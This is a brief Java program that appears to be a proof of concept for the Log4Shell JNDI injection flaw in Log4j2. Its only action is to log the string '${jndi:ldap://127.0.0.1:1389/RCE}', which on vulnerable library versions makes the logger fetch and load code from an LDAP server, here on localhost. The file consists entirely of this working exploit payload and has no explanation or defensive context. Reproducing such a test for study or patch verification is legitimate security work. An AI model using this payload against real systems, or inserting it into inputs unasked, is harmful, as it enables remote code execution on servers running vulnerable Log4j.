import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4j2JNDI {

    public static void main(String args[]) {
        Logger logger = LogManager.getLogger(Log4j2JNDI.class);
        logger.error("${jndi:ldap://127.0.0.1:1389/RCE}");
    }
}
